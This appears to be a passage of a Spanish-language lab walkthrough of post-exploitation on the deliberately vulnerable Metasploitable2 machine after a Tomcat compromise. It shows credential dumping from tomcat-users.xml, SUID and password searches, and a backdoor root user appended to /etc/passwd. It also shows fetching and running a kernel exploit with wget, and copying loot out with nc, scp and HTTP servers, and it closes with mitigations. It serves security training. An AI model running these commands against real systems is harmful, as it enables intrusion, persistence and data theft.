/etc/tomcat5.5/Catalina/localhost/admin.xml
/etc/tomcat5.5/Catalina/localhost/host-manager.xml
/etc/tomcat5.5/Catalina/localhost/manager.xml
/etc/tomcat5.5/context.xml
/etc/tomcat5.5/web.xml
/etc/tomcat5.5/tomcat-users.xml
/etc/tomcat5.5/server-minimal.xml
/etc/fdmount.conf
/etc/inetd.conf
/etc/nsswitch.conf
/etc/udev/udev.conf
/etc/updatedb.conf
/etc/defoma/config/pango.conf
/etc/initramfs-tools/update-initramfs.conf
/etc/initramfs-tools/initramfs.conf
/etc/resolv.conf
/etc/dhcp3/dhclient.conf
/etc/e2fsck.conf
/etc/gtk-2.0/im-multipress.conf
/etc/proftpd/proftpd.conf
/etc/proftpd/sql.conf
/etc/proftpd/tls.conf
/etc/proftpd/modules.conf
/etc/proftpd/ldap.conf
/etc/apache2/ports.conf
/etc/apache2/mods-available/setenvif.conf
/etc/apache2/mods-available/negotiation.conf
/etc/apache2/mods-available/mime.conf
/etc/apache2/mods-available/alias.conf
/etc/apache2/mods-available/dir.conf
/etc/apache2/mods-available/php5.conf
/etc/apache2/mods-available/mime_magic.conf
/etc/apache2/mods-available/proxy.conf
/etc/apache2/mods-available/disk_cache.conf
/etc/apache2/mods-available/cgid.conf
/etc/apache2/mods-available/actions.conf
/etc/apache2/mods-available/autoindex.conf
/etc/apache2/mods-available/userdir.conf
/etc/apache2/mods-available/ssl.conf
/etc/apache2/mods-available/status.conf
/etc/apache2/mods-available/info.conf
/etc/apache2/mods-available/mem_cache.conf
/etc/apache2/mods-available/dav_fs.conf
/etc/apache2/mods-available/deflate.conf
/etc/apache2/mods-enabled/php.conf
/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/fonts/fonts.conf
/etc/fonts/conf.avail/50-user.conf
/etc/fonts/conf.avail/20-unhint-small-vera.conf
/etc/fonts/conf.avail/10-unhinted.conf
/etc/fonts/conf.avail/10-antialias.conf
/etc/fonts/conf.avail/52-languageselector.conf
/etc/fonts/conf.avail/70-yes-bitmaps.conf
/etc/fonts/conf.avail/10-sub-pixel-vrgb.conf
/etc/fonts/conf.avail/53-monospace-lcd-filter.conf
/etc/fonts/conf.avail/10-hinting-full.conf
/etc/fonts/conf.avail/10-hinting-medium.conf
/etc/fonts/conf.avail/70-no-bitmaps.conf
/etc/fonts/conf.avail/10-hinting-slight.conf
/etc/fonts/conf.avail/25-unhint-nonlatin.conf
/etc/fonts/conf.avail/10-hinting.conf
/etc/fonts/conf.avail/49-sansserif.conf
/etc/fonts/conf.avail/10-sub-pixel-vbgr.conf
/etc/fonts/conf.avail/40-nonlatin.conf
/etc/fonts/conf.avail/69-unifont.conf
/etc/fonts/conf.avail/60-latin.conf
/etc/fonts/conf.avail/65-fonts-persian.conf
/etc/fonts/conf.avail/10-no-sub-pixel.conf
/etc/fonts/conf.avail/30-metric-aliases.conf
/etc/fonts/conf.avail/10-sub-pixel-rgb.conf
/etc/fonts/conf.avail/45-latin.conf
/etc/fonts/conf.avail/90-synthetic.conf
/etc/fonts/conf.avail/51-local.conf
/etc/fonts/conf.avail/65-nonlatin.conf
/etc/fonts/conf.avail/10-sub-pixel-bgr.conf
/etc/fonts/conf.avail/10-autohint.conf
/etc/fonts/conf.avail/20-fix-globaladvance.conf
/etc/fonts/conf.avail/30-urw-aliases.conf
/etc/fonts/conf.avail/80-delicious.conf
/etc/security/group.conf
/etc/security/access.conf
/etc/security/pam_env.conf
/etc/security/time.conf
/etc/security/namespace.conf
/etc/security/limits.conf
/etc/hdparm.conf
/etc/popularity-contest.conf
/etc/mke2fs.conf
/etc/devscripts.conf
/etc/ufw/sysctl.conf
/etc/ufw/ufw.conf
/etc/esound/esd.conf
/etc/syslog.conf
/etc/postgresql/8.3/main/pg_ident.conf
/etc/postgresql/8.3/main/postgresql.conf
/etc/postgresql/8.3/main/pg_hba.conf
/etc/postgresql/8.3/main/start.conf
/etc/ucf.conf
/etc/idmapd.conf
/etc/deluser.conf
/etc/X11/xorg.conf
/etc/X11/xkb/base.xml
/etc/bind/named.conf
/etc/kernel-img.conf
/etc/cowpoke.conf
/etc/xinetd.conf
/var/lib/gconf/defaults/%gconf-tree-hu.xml
/var/lib/gconf/defaults/%gconf-tree-lt.xml
/var/lib/gconf/defaults/%gconf-tree-ar.xml
/var/lib/gconf/defaults/%gconf-tree-zh_CN.xml
/var/lib/gconf/defaults/%gconf-tree-sv.xml
/var/lib/gconf/defaults/%gconf-tree-dz.xml
/var/lib/gconf/defaults/%gconf-tree-gl.xml
/var/lib/gconf/defaults/%gconf-tree-sq.xml
/var/lib/gconf/defaults/%gconf-tree-cs.xml
/var/lib/gconf/defaults/%gconf-tree-de.xml
/var/lib/gconf/defaults/%gconf-tree-fr.xml
/var/lib/gconf/defaults/%gconf-tree-ru.xml
/var/lib/gconf/defaults/%gconf-tree-nn.xml
/var/lib/gconf/defaults/%gconf-tree-ko.xml
/var/lib/gconf/defaults/%gconf-tree-mk.xml
/var/lib/gconf/defaults/%gconf-tree-et.xml
/var/lib/gconf/defaults/%gconf-tree-es.xml
/var/lib/gconf/defaults/%gconf-tree-ja.xml
/var/lib/gconf/defaults/%gconf-tree-ur.xml
/var/lib/gconf/defaults/%gconf-tree-te.xml
/var/lib/gconf/defaults/%gconf-tree-id.xml
/var/lib/gconf/defaults/%gconf-tree-af.xml
/var/lib/gconf/defaults/%gconf-tree-da.xml
/var/lib/gconf/defaults/%gconf-tree-ro.xml
/var/lib/gconf/defaults/%gconf-tree-he.xml
/var/lib/gconf/defaults/%gconf-tree-be@latin.xml
/var/lib/gconf/defaults/%gconf-tree-ca@valencia.xml
/var/lib/gconf/defaults/%gconf-tree-fi.xml
/var/lib/gconf/defaults/%gconf-tree-sr.xml
/var/lib/gconf/defaults/%gconf-tree-en_GB.xml
/var/lib/gconf/defaults/%gconf-tree-ca.xml
/var/lib/gconf/defaults/%gconf-tree-pa.xml
/var/lib/gconf/defaults/%gconf-tree-zh_TW.xml
/var/lib/gconf/defaults/%gconf-tree-nl.xml
/var/lib/gconf/defaults/%gconf-tree-tr.xml
/var/lib/gconf/defaults/%gconf-tree-eo.xml
/var/lib/gconf/defaults/%gconf-tree-it.xml
/var/lib/gconf/defaults/%gconf-tree-sl.xml
/var/lib/gconf/defaults/%gconf-tree-nb.xml
/var/lib/gconf/defaults/%gconf-tree-sk.xml
/var/lib/gconf/defaults/%gconf-tree.xml
/var/lib/gconf/defaults/%gconf-tree-pt_BR.xml
/var/lib/gconf/defaults/%gconf-tree-sr@latin.xml
/var/lib/gconf/defaults/%gconf-tree-el.xml
/var/lib/gconf/defaults/%gconf-tree-zh_HK.xml
/var/lib/gconf/defaults/%gconf-tree-vi.xml
/var/lib/tomcat5.5/webapps/shell/WEB-INF/web.xml
/var/lib/defoma/fontconfig.d/fonts.conf
/var/lib/ucf/cache/:etc:samba:smb.conf
/var/lib/ucf/cache/:etc:idmapd.conf
/var/www/dvwa/external/phpids/0.6/build.xml
/var/www/dvwa/external/phpids/0.6/lib/IDS/default_filter.xml
/var/www/mutillidae/owasp-esapi-php/src/ESAPI.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/src/changes/changes.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/src/site/site.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/src/assembly/bin.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/src/examples/resources/levelmatchfilter.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/src/examples/resources/levelrangefilter.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/src/examples/resources/stringmatchfilter.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/src/test/php/configurators/test1.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/src/test/php/phpunit.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/build.xml
/var/www/mutillidae/owasp-esapi-php/lib/apache-log4php/trunk/pom.xml
/var/www/mutillidae/owasp-esapi-php/test/testresources/ESAPI_IDS_Tests.xml
/var/www/mutillidae/owasp-esapi-php/test/testresources/ESAPI.xml
/var/www/mutillidae/owasp-esapi-php/test/testresources/antisamy.xml
/var/www/phpMyAdmin/contrib/packaging/Fedora/phpMyAdmin-http.conf
/var/www/phpMyAdmin/contrib/swekey.sample.conf
/var/www/tikiwiki-old/lib/smarty/demo/configs/test.conf
/var/www/tikiwiki-old/lib/smarty/unit_test/configs/globals_single_quotes.conf
/var/www/tikiwiki-old/lib/smarty/unit_test/configs/globals_double_quotes.conf
/var/www/tikiwiki-old/doc/99_tiki-apache.conf
/var/www/tikiwiki-old/tikimovies/sample.xml
/var/www/tikiwiki/lib/smarty/demo/configs/test.conf
/var/www/tikiwiki/lib/smarty/unit_test/configs/globals_single_quotes.conf
/var/www/tikiwiki/lib/smarty/unit_test/configs/globals_double_quotes.conf
/var/www/tikiwiki/doc/99_tiki-apache.conf
/var/www/tikiwiki/tikimovies/sample.xml
/var/spool/postfix/etc/nsswitch.conf
/var/spool/postfix/etc/resolv.conf

En nuestro caso, al ser **tomcat55**, vamos a buscar archivos de configuración de Tomcat que puedan contener credenciales.

## 🔑 Paso 8: Buscar credenciales guardadas.

Apache Tomcat guarda credenciales de administración en **tomcat-users.xml**:

```bash
find / -name "tomcat-users.xml" 2>/dev/null
```

**Resultado:** 

/etc/tomcat5.5/tomcat-users.xml

```bash
cat /etc/tomcat.5/tomcat-users.xml
```

**Resultado:**

<?xml version='1.0' encoding='utf-8'?>
<tomcat-users>
  <role rolename="admin"/>
  <role rolename="tomcat"/>
  <role rolename="manager"/>
  <role rolename="role1"/>
  <user username="tomcat" password="tomcat" roles="tomcat,admin,manager"/>
  <user username="role1" password="tomcat" roles="role1"/>
  <user username="both" password="tomcat" roles="tomcat,role1"/>
</tomcat-users>


Estos comandos nos podrían dar usuarios y contraseñas para otros servicios (a veces son reutilizables por root).

## 📈 Paso 9: Escalada de privilegios

Teniendo acceso como un usuario con pocos privilegios, buscamos:

```bash
# Archivos con bit SUID que no deberían estar ahí
find / -perm -4000 -type f 2>/dev/null
```

**Resultado:**

/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown


```bash
# Scripts o binarios con permisos indebidos
find / -writable -type f 2>/dev/null
```

**Resultado:**

No nos devuelve nada, demostrando que con el usuario actual no existe archivo alguno en toda la raíz / en el que podamos escribir.

```bash
# Comandos que puedo usar como sudo (a veces la password es la misma)
sudo -l
```

**Resultado:**

Como intentamos listar los archivos con sudo, nos pide una contraseña la cual aún no hemos obtenido. 
Para salir de passwod: presionamos Control + C


En Metasploitable2, es común encontrar vectores como:

- Exploits locales del kernel (Linux 2.6.24 tiene varios public exploits para LPE).
- SUID binarios mal configurados.
- Credenciales en archivos.

Ejemplo: subir un exploit local (Dirty COW, etc) desde Kali:

```bash
wget http://<tu-ip>/exploit.c
gcc exploit.c -o exploit
./exploit
```

## 📂 Paso 10: Recolectar información sensible

Recopilaremos:

```bash
# Historial de comandos
cat ~/.bash_history
```

**Resultado:**

No encontramos historial en la máquina atacante de comandos.

```bash
# Archivos con contraseñas
grep -i "password" /etc/*.conf 2>/dev/null
```

**Resultado:**

/etc/cowpoke.conf:# using a simple password (or worse, a normal user password), then you can
/etc/debconf.conf:# World-readable, and accepts everything but passwords.
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:# databases, one to hold passwords and one for everything else.
/etc/debconf.conf:Stack: config, passwords
/etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
/etc/devscripts.conf:# options may be used to specify the username and password to use.
/etc/devscripts.conf:# If only a username is provided then the password will be prompted for
/etc/devscripts.conf:# BTS_SMTP_AUTH_PASSWORD=pass
/etc/hdparm.conf:# --security-set-pass Set security password
/etc/hdparm.conf:# security_pass = password
/etc/hdparm.conf:# --user-master Select password to use
tomcat55@metasploitable:/$ 


```bash
grep -i "password" /var/www/* 2>/dev/null
```

**Resultado:**

No nos devuelve nada el segundo comando.

```bash
# Claves privadas SSH
find / -name "id_rsa" 2>/dev/null
```

**Resultado:**

No devuelve nada actualmente ya que con el usuario actual (sin ser rooT) no tenemos los permisos para ver determinados directorios.

En Metasploitable2 suelen encontrarse usuarios con contraseñas en texto plano en sus home o en configuraciones de aplicaciones.

## ♻️ Paso 11: Persistencia

Si no queremos perder acceso debemos:

- Creamos un usuario con acceso SSH:

 ```bash
echo "hacker::0:0:root:/root:/bin/bash" >> /etc/passwd
```

- Subir tu clave pública SSH a /root/.ssh/authorized_keys.

## Paso 12: Obtener acceso a usuario root:

Como somos usuario tomcat55, debemos buscar credenciales reutilizadas.

Focalizamos en:

```bash
# Archivos de configuración de Tomcat
find / -name "tomcat-users.xml" 2>/dev/null

# Configs con la palabra "password"
grep -ri "password" /etc/tomcat5.5 2>/dev/null
grep -ri "password" /var/lib/tomcat5.5 2>/dev/null

# Archivos web (pueden tener credenciales de BBDD o admin)
grep -ri "password" /var/www 2>/dev/null
```

Cualquier usuario/contraseña que encontremos la guardamos en:

```bash
echo "Usuario: XXX | Pass: YYY | Origen: /ruta/archivo" >> ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/credenciales.txt
```

Una vez que tengamos una credencial válida de root o un usuario sudo, probamos:

```bash
su root
su msfadmin
```

Y despues:

```bash
sudo -l
```

Si no tenemos credenciales pero encontramos un **exploit local** (como para Linux 2.6.24) lo subimos y compilamos en nuestra Kali:

```bash
# En Kali
wget https://www.exploit-db.com/raw/9542 -O exploit.c
gcc exploit.c -o exploit
python3 -m http.server 8080

# En la víctima
cd /tmp
wget http://<IP_KALI>:8080/exploit
chmod +x exploit
./exploit
```

Una vez como root:

```bash
whoami > /tmp/root.txt
cat /tmp/root.txt | tee ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/root.txt
```


## 🕵️ Paso 12: Pivoting y explotación de otros servicios.




## 🛡️ Paso 1: Mitigaciones

- No usar credenciales por defecto.
- Restringir el acceso a /manager/html por IP.
- Usar HTTPS y autenticación fuerte.
- Deshabilitar el despliegue remoto si no es necesario.
- Mantener Tomcat actualizado.

## 📜 Resumen del ataque

1. Escaneo con Nmap -> Apache Tomcat detectado.
2. Acceso al panel /manager/html.
3. Uso de credenciales por defecto tomcat:tomcat
4. Creación de payload WAR con msfvenom.
5. Despliegue en el panel de administración.
6. Ejecución del WAR -> reverse shell con Netcat.
7. Enumeración y post-explotación.

## 🔍 Tip extra: Estabilizar la shell.

Con una shell limitada (netcat pura), debemos upgradearla a algo más cómodo:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Luego:

```bash
export TERM=xterm
CTRL+Z   # suspender
stty raw -echo; fg
```

Ahora tenemos una shell interactiva más estable.

## Tip extra 2: Cómo guardar la información

En la shell de tomcat55, cada vez que saquemos algo lo guardamos con tee para que aparezca en pantalla y se guarde en archivo.

Ejemplo:

```bash
# Información básica del sistema
uname -a | tee ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/info_sistema.txt
id | tee -a ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/info_sistema.txt

# Lista de usuarios
cat /etc/passwd | tee ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/usuarios.txt

# Procesos
ps aux | tee ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/procesos.txt

# Red
netstat -tulnp | tee ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/red.txt
```

(Si no puedes usar rutas absolutas de tu Kali en la shell remota debido a que nuestro usuario no tiene privilegios, lo guardamos en /tmp de la víctima y luego lo descargamos con scp o nc.)

### Metodos para obtener la información de la máquina atacante a nuestro Kali:

#### Método 1 --- SCP (si la víctima tiene SSH activo).

Si en el escaneo inicial vimos que el puerto 22 (OpenSSH) estaba abierto, puedes usar scp para traer los archivos:

En nuestra kali:

```bash
scp root@192.168.56.102:/tmp/*.txt ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/
```

- root@192.168.56.102 -> Usuario y IP de la víctima.
- /tmp/*.txt -> todos los archivos que guardamos.
- Pedirá contraseña de root.

#### Método 2 --- Servidor HTTP con Python en la víctima.

En la shell root de la víctima:

```bash
cd /tmp
python -m SimpleHTTPServer 8000
```

o en Python 3:

```bash
python3 -m http.server 8000
```

Y, luego en nuestro Kali:

```bash
wget http://192.168.56.102:8000/info_sistema.txt
wget http://192.168.56.102:8000/usuarios.txt
wget http://192.168.56.102:8000/red.txt
wget http://192.168.56.102:8000/credenciales.txt
```

Éste método es muy útil cuando SSH no es viable.

#### Método 3 --- Usar nc para transferencia directa.

En Kali (modo escucha y guardar en archivo):

```bash
nc -lvnp 9001 > info_sistema.txt
```

En la víctima (root):

```bash
nc 192.168.56.101 9001 < /tmp/info_sistema.txt
```

Repite para cada archivo cambiando nombre y puerto o usando tar para empaquetar todo.

#### Método 4 -- Empaquetar todo y descargar de una sóla vez.

En la víctima:

```bash
cd /tmp
tar czvf postex_tomcat.tar.gz *.txt
python3 -m http.server 8000
```

En Kali:

```bash
wget http://192.168.56.102:8000/postex_tomcat.tar.gz
tar xzvf postex_tomcat.tar.gz -C ~/Pentesting/Metasploitable2/ApacheTomcat/post-explotacion/
```

💡 Recomendación de pentester
Siempre que tengas root, empaquetar todo con tar es más limpio y rápido que ir archivo por archivo. Además, deja un único artefacto para almacenar como evidencia.


💡 Lección aprendida: No dejar nunca paneles administrativos expuestos con credenciales por defecto. Este vector es extremadamente común y devastador.


  
